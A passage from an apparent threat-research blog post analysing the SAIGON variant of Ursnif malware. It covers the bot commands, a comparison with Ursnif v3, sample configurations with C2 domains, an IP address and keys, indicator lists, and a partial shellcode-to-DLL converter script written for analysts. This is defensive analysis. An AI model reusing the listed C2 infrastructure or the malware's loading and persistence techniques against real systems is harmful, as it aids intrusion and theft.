\/s\u003C\/i\u003E\u0026quot;\u003C\/li\u003E\n\u003C\/ol\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0x83bf8ea0\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003ELOAD_DLL\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003EDownload data from URL, decrypt and verify, then use the same shellcode loader that was used to load itself into memory to load the DLL into the current process\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022101\u0022\u003E\u003Cp\u003E\u003Ci\u003E0xa8e78c43\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022120\u0022\u003E\u003Cp\u003E\u003Ci\u003ELOAD_EXE\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022410\u0022\u003E\u003Cp\u003EDownload data from URL, decrypt and verify, save with an \u003Ci\u003E.exe\u003C\/i\u003E extension, invoke using \u003Ci\u003EShellExecute\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 3: SAIGON bot commands\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch5\u003EComparison to Ursnif v3\u003C\/h5\u003E\n\u003Cp\u003ETable 4 shows the similarities between Ursnif v3 and the analyzed SAIGON samples (differences are highlighted in \u003Cb\u003Ebold\u003C\/b\u003E):\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022631\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Cb\u003E\u0026nbsp;\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003EUrsnif v3 (RM3)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003ESaigon (Ursnif v3.5?)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EPersistence method\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EScheduled task that executes code stored in a registry key using PowerShell\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EScheduled task that executes code stored in a registry key using PowerShell\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EConfiguration storage\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ESecurity PE directory points to embedded binary data starting with \u0027\u003Ci\u003EWD\u003C\/i\u003E\u0027 magic bytes (aka. Ursnif \u0026quot;joined files\u0026quot;)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ESecurity PE directory points to embedded binary data starting with \u0027\u003Ci\u003EWD\u003C\/i\u003E\u0027 magic bytes (aka. Ursnif \u0026quot;joined files\u0026quot;)\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EPRNG algorithm\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003Exorshift64*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003Exorshift64*\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EChecksum algorithm\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003EJAMCRC (aka. CRC32 with all the bits flipped)\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003ECRC32, with the result rotated to the right by 1 bit\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EData compression\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EaPLib\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EaPLib\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EEncryption\/Decryption\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ESerpent \u003Cb\u003ECBC\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ESerpent \u003Cb\u003EECB\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EData integrity verification\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ERSA signature\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ERSA signature\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003ECommunication method\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EHTTP POST requests\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EHTTP POST requests\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EPayload encoding\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EUnpadded Base64 (\u0027+\u0027 and \u0027\/\u0027 are replaced with \u0027\u003Cb\u003E_2B\u003C\/b\u003E\u0027 and \u0027\u003Cb\u003E_2F\u003C\/b\u003E\u0027 respectively), \u003Cb\u003Erandom slashes are added\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EUnpadded Base64 (\u0027+\u0027 and \u0027\/\u0027 are replaced with \u0027\u003Cb\u003E%2B\u003C\/b\u003E\u0027 and \u0027\u003Cb\u003E%2F\u003C\/b\u003E\u0027 respectively), \u003Cb\u003Eno random slashes\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EUses URL path mimicking?\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003EYes\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003ENo\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EUses PX file format?\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003EYes\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u003Cb\u003ENo\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 4: Similarities and differences between Ursnif v3 and SAIGON samples\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFigure 4 shows Ursnif v3\u0027s use of URL path mimicking. This tactic has not been seen in other Ursnif variants, including SAIGON.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Picture4.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4:\u0026nbsp;Ursnif v3 mimicking (red) previously seen benign browser traffic (green) not seen in SAIGON samples\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EImplications\u003C\/h4\u003E\n\u003Cp\u003EIt is currently unclear whether SAIGON is representative of a broader evolution in the Ursnif malware ecosystem. The low number of SAIGON samples identified thus far\u2014all of which have compilations timestamps in 2018\u2014may suggest that SAIGON was a temporary branch of Ursnif v3 adapted for use in a small number of operations. Notably, SAIGON\u2019s capabilities also distinguish it from typical banking malware and may be more suited toward supporting targeted intrusion operations. This is further supported via our prior identification of SAIGON on a server that hosted tools used in point-of-sale intrusion operations as well as \u003Ca href=\u0022https:\/\/usa.visa.com\/dam\/VCOM\/global\/support-legal\/documents\/cybercrime-groups-targeting-fuel-dispenser-merchants.pdf\u0022\u003EVISA\u2019s\u003C\/a\u003E recent notification of the malware appearing on a compromised hospitality organization\u2019s network along with tools previously used by FIN8.\u003C\/p\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EThe authors would like to thank Kimberly Goody, Jeremy Kennelly and James Wyke for their support on this blog post.\u003C\/p\u003E\n\u003Ch4\u003EAppendix A: Samples\u003C\/h4\u003E\n\u003Cp\u003EThe following is a list of samples including their embedded configuration:\u003C\/p\u003E\n\u003Cp\u003ESample SHA256: 8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5\u003Cbr\u003E\nSample Version: 3.50.132\u003Cbr\u003E\nPE Timestamp: 2018-07-07T14:51:30\u003Cbr\u003E\nXOR Cookie: 0x40d822d9\u003Cbr\u003E\nC2 URLs:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttps:\/\/google-download[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-google-eu[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-gmail-us[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EGroup \/ Botnet ID: 1001\u003Cbr\u003E\nServer Key: rvXxkdL5DqOzIRfh\u003Cbr\u003E\nIdle Period: 30\u003Cbr\u003E\nLoad Period: 300\u003Cbr\u003E\nHost Keep Time: 1440\u003Cbr\u003E\nRSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c\u003Cbr\u003E\n021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915\u003Cbr\u003E\nd0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\u003C\/p\u003E\n\u003Cp\u003ESample SHA256: c6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6\u003Cbr\u003E\nSample Version: 3.50.132\u003Cbr\u003E\nPE Timestamp: 2018-07-07T14:51:41\u003Cbr\u003E\nXOR Cookie: 0x40d822d9\u003Cbr\u003E\nC2 URLs:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttps:\/\/google-download[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-google-eu[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-gmail-us[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EGroup \/ Botnet ID: 1001\u003Cbr\u003E\nServer Key: rvXxkdL5DqOzIRfh\u003Cbr\u003E\nIdle Period: 30\u003Cbr\u003E\nLoad Period: 300\u003Cbr\u003E\nHost Keep Time: 1440\u003Cbr\u003E\nRSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c\u003Cbr\u003E\n021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915\u003Cbr\u003E\nd0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\u003C\/p\u003E\n\u003Cp\u003ESample SHA256: 431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e\u003Cbr\u003E\nSample Version: 3.50.199\u003Cbr\u003E\nPE Timestamp: 2018-11-15T11:17:09\u003Cbr\u003E\nXOR Cookie: 0x40d822d9\u003Cbr\u003E\nC2 URLs:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttps:\/\/mozilla-yahoo[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-mozilla-sn45[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-digicert-i31[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EGroup \/ Botnet ID: 1000\u003Cbr\u003E\nServer Key: rvXxkdL5DqOzIRfh\u003Cbr\u003E\nIdle Period: 60\u003Cbr\u003E\nLoad Period: 300\u003Cbr\u003E\nHost Keep Time: 1440\u003Cbr\u003E\nRSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b15\u003Cbr\u003E\n02ccb5c021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f5\u003Cbr\u003E\n93518a2cf4915d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\u003C\/p\u003E\n\u003Cp\u003ESample SHA256: 628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9\u003Cbr\u003E\nSample Version: 3.50.209\u003Cbr\u003E\nPE Timestamp: 2018-12-04T10:47:56\u003Cbr\u003E\nXOR Cookie: 0x40d822d9\u003Cbr\u003E\nC2 URLs\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttp:\/\/softcloudstore[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/146.0.72.76\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/setworldtime[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/securecloudbase[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EBotnet ID: 1000\u003Cbr\u003E\nServer Key: 0123456789ABCDEF\u003Cbr\u003E\nIdle Period: 20\u003Cbr\u003E\nMinimum Uptime: 300\u003Cbr\u003E\nLoad Period: 1800\u003Cbr\u003E\nHost Keep Time: 360\u003Cbr\u003E\nRSA Public Key: (0xdb7c3a9ea68fbaf5ba1aebc782be3a9e75b92e677a114b52840d2bbafa8ca49da40a64664d80cd62d9453\u003Cbr\u003E\n34f8457815dd6e75cffa5ee33ae486cb6ea1ddb88411d97d5937ba597e5c430a60eac882d8207618d14b660\u003Cbr\u003E\n70ee8137b4beb8ecf348ef247ddbd23f9b375bb64017a5607cb3849dc9b7a17d110ea613dc51e9d2aded, 0x10001)\u003C\/p\u003E\n\u003Ch4\u003EAppendix B: IOCs\u003C\/h4\u003E\n\u003Cp\u003ESample hashes:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5\u003C\/li\u003E\n\u003Cli\u003Ec6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6\u003C\/li\u003E\n\u003Cli\u003E431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e [\u003Ca href=\u0022https:\/\/www.virustotal.com\/gui\/file\/431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e\u0022\u003EVT\u003C\/a\u003E]\u003C\/li\u003E\n\u003Cli\u003E628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9 [\u003Ca href=\u0022https:\/\/www.virustotal.com\/gui\/file\/628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9\u0022\u003EVT\u003C\/a\u003E]\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EC2 servers:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttps:\/\/google-download[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-google-eu[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-gmail-us[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/mozilla-yahoo[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-mozilla-sn45[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-digicert-i31[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/softcloudstore[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/146.0.72.76\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/setworldtime[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/securecloudbase[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EUser-Agent:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u0026quot;Mozilla\/5.0 (Windows NT \u003Ci\u003E\u0026lt;os_version\u0026gt;\u003C\/i\u003E; rv:58.0) Gecko\/20100101 Firefox\/58.0\u0026quot;\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EOther host-based indicators:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u0026quot;Power\u003Ci\u003E\u0026lt;random_string\u0026gt;\u003C\/i\u003E\u0026quot; scheduled task\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;PsRun\u0026quot; value under the HKCU\\Identities\\{\u003Ci\u003E\u0026lt;random_guid\u0026gt;\u003C\/i\u003E} registry key\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003EAppendix C: Shellcode Converter Script\u003C\/h4\u003E\n\u003Cp\u003EThe following Python script is intended to ease analysis of this malware. This script converts the SAIGON shellcode blob back into its original DLL form by removing the PE loader and restoring its PE header. These changes make the analysis of SAIGON shellcode blobs much simpler (e.g. allow loading of the files in IDA), however, the created DLLs will still crash when run in a debugger as the malware still relies on its (now removed) PE loader during the process injection stage of its execution. After this conversion process, the sample is relatively easy to analyze due to its small size and because it is not obfuscated.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E#!\/usr\/bin\/env python3\u003Cbr\u003E\nimport argparse\u003Cbr\u003E\nimport struct\u003Cbr\u003E\nfrom datetime import datetime\u003C\/p\u003E\n\u003Cp\u003EMZ_HEADER = bytes.fromhex(\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u00274d5a90000300000004000000ffff0000\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0027b8000000000000004000000000000000\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u002700000000000000000000000000000000\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u002700000000000000000000000080000000\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u00270e1fba0e00b409cd21b8014ccd215468\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u002769732070726f6772616d2063616e6e6f\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0027742062652072756e20696e20444f5320\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u00276d6f64652e0d0d0a2400000000000000\u0027\u003Cbr\u003E\n)\u003C\/p\u003E\n\u003Cp\u003Edef main():\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; parser = argparse.ArgumentParser(description=\u0026quot;Shellcode to PE converter for the Saigon malware family.\u0026quot;)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; parser.add_argument(\u0026quot;sample\u0026quot;)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; args = parser.parse_args()\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; with open(args.sample, \u0026quot;rb\u0026quot;) as f:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; data = bytearray(f.read())\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; if data.startswith(b\u0027MZ\u0027):\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; lfanew = struct.unpack_from(\u0027=I\u0027, data, 0x3c)[0]\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; print(\u0027This is already an MZ\/PE file.\u0027)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; return\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; elif not data.startswith(b\u0027\\xe9\u0027):\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; print(\u0027Unknown file type.\u0027)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; return\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; struct.pack_into(\u0027=I\u0027, data, 0, 0x00004550)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; if data[5] == 0x01:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=H\u0027, data, 4, 0x14c)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; elif data[5] == 0x86:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=H\u0027, data, 4, 0x8664)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; else:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; print(\u0027Unknown architecture.\u0027)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; return\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; # file alignment\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=I\u0027, data, 0x3c, 0x200)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; optional_header_size, _ = struct.unpack_from(\u0027=HH\u0027, data, 0x14)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; magic, _, _, size_of_code = struct.unpack_from(\u0027=HBBI\u0027, data, 0x18)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; print(\u0027Magic:\u0027, hex(magic))\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; print(\u0027Size of code:\u0027, hex(size_of_code))\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; base_of_code, base_of_data = struct.unpack_from(\u0027=II\u0027, data, 0x2c)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; if magic == 0x20b:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; # base of data, does not exist in PE32+\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; if size_of_code \u0026amp; 0x0fff:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; tmp = (size_of_code \u0026amp; 0xfffff000) + 0x1000\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; else:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; tmp = size_of_code\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; base_of_data = base_of_code + tmp\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; print(\u0027Base of code:\u0027, hex(base_of_code))\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; print(\u0027Base of data:\u0027, hex(base_of_data))\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; data[0x18 + optional_header_size : 0x1000] = b\u0027\\0\u0027 * (0x1000 - 0x18 - optional_header_size)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; size_of_header = struct.unpack_from(\u0027=I\u0027, data, 0x54)[0]\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; data_size = 0x3000\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; pos = data.find(struct.pack(\u0027=IIIII\u0027, 3, 5, 7, 11, 13))\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; if pos \u0026gt;= 0:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; data_size = pos - base_of_data\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; section = 0\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.text\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; size_of_code, base_of_code,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; base_of_data - base_of_code, size_of_header,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x60000020\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.rdata\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; data_size, base_of_data,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; data_size, size_of_header + base_of_data - base_of_code,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x40000040\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; section += 1\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.data\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, base_of_data + data_size,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x1000, size_of_header + base_of_data - base_of_code + data_size,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; 